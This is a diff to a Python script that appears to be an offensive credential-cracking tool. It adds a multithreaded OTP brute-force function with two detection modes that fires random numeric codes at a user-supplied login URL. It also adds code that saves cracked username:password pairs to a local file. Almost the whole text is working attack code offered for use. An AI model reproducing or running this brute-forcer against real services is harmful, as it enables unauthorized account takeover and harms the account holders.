@@ -22,28 +22,105 @@ print("."*100)
 
 
 def otp():
-    url = input("Enter url (http://google.com/login): ")
-    otps = input("Enter variable name of OTP (otp): ")
-    wentry = input("Enter response when entry is wrong: ")
-    n = int(input("Enter otp Length (4): "))
-    tn = int(input("Enter Thread (20): "))
+    print("HI there is two mode to perform brute force attack you can enter one to continue if it is not working try mode 2.")
+    a = int(input("Enter here (1/2): "))
+    if a == 1:
+        url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
+        otps = input("Enter where is password stored: ")
+        bca = input("response when failed: ")
+        n = int(input("Enter password length(4): "))
+        tn = int(input("Enter thread count(20): "))
 
-    def send_o(otpv):
-        data = {
-            otps:otpv
-        }
-        res = requests.post(url,data=data)
-        return res
-    otprandom = '0123456789'
-    while True:
-        rndpasswd = random.choices(otprandom, k=n)
-        otpv = "".join(rndpasswd)
-        r = send_o(otpv)
-        if wentry in r:
-            print(f"Incorrect OTP: {otpv}")
-        else:
-            print(f"Correct OTP: {otpv}")
-            break
+        def send_request(password):
+            data = {
+                otps: password,
+            }
+
+            r = requests.get(url, data=data)
+            return r
+
+        chars = "0123456789"
+
+        def main():
+            while True:
+                if "correct_pass.txt" in os.listdir():
+                    break
+                valid = False
+                while not valid:
+                    rndpasswd = random.choices(chars, k=n)
+                    passwd = "".join(rndpasswd)
+                    file = open("tries.txt", 'r')
+                    tries = file.read()
+                    file.close()
+                    if passwd in tries:
+                        pass
+                    else:
+                        valid = True
+
+                    r = send_request(passwd)
+
+                    if str(bca) in r.text.lower():
+                        with open("tries.txt", "a") as f:
+                            f.write(f"{passwd}\n")
+                            f.close()
+                        print(f"Incorrect {passwd}\n")
+                    else:
+                        print(f"Correct otp is {passwd}!\n")
+                        with open("correct_pass.txt", "w") as f:
+                            f.write(passwd)
+                        break
+                    break
+        for x in range(tn):
+            Thread(target=main).start()
+    elif a == 2:
+        url = input("Enter url ( https://requestswebsite.notanothercoder.repl.co/confirm-login ): ")
+        otps = input("Enter where is password stored: ")
+        bca = input("response when failed: ")
+        n = int(input("Enter password length(4): "))
+        tn = int(input("Enter thread count(20): "))
+
+        def send_request(password):
+            data = {
+                otps: password,
+            }
+
+            r = requests.get(url, data=data)
+            return r
+
+        chars = "0123456789"
+
+        def main():
+            while True:
+                if "correct_pass.txt" in os.listdir():
+                    break
+                valid = False
+                while not valid:
+                    rndpasswd = random.choices(chars, k=n)
+                    passwd = "".join(rndpasswd)
+                    file = open("tries.txt", 'r')
+                    tries = file.read()
+                    file.close()
+                    if passwd in tries:
+                        pass
+                    else:
+                        valid = True
+
+                    r = send_request(passwd)
+
+                    if r.status_code == 200:
+                        with open("tries.txt", "a") as f:
+                            f.write(f"{passwd}\n")
+                            f.close()
+                        print(f"Incorrect {passwd}\n")
+                    else:
+                        print(f"Correct otp is {passwd}!\n")
+                        with open("correct_pass.txt", "w") as f:
+                            f.write(passwd)
+                        break
+                    break
+
+        for x in range(tn):
+            Thread(target=main).start()
 
 
 def directory():
@@ -155,6 +232,19 @@ def passnoword():
                         print(f"Correct Password {passwd}!\n")
                         with open("correct_pass.txt", "w") as f:
                             f.write(passwd)
+                        with open('saves/passwd.txt', 'a') as m:
+                            m.write("newscan\n")
+                            for i in range(100):
+                                m.write('*')
+                            m.write('\n')
+                            m.write('\n')
+                            m.write(url)
+                            m.write('\n')
+                            m.write(f'{username}:{passwd}')
+                            m.write('\n')
+                            for i in range(100):
+                                m.write('*')
+                            m.close()
                         break
                     break
         for x in range(tn):
@@ -207,6 +297,19 @@ def passnoword():
                         with open("correct_pass.txt", "w") as f:
                             f.write(passwd)
                             f.close()
+                        with open('saves/passwd.txt', 'a') as m:
+                            m.write("newscan\n")
+                            for i in range(100):
+                                m.write('*')
+                            m.write('\n')
+                            m.write('\n')
+                            m.write(url)
+                            m.write('\n')
+                            m.write(f'{username}:{passwd}')
+                            m.write('\n')
+                            for i in range(100):
+                                m.write('*')
+                            m.close()
                         break
                     break
         for x in range(tn):
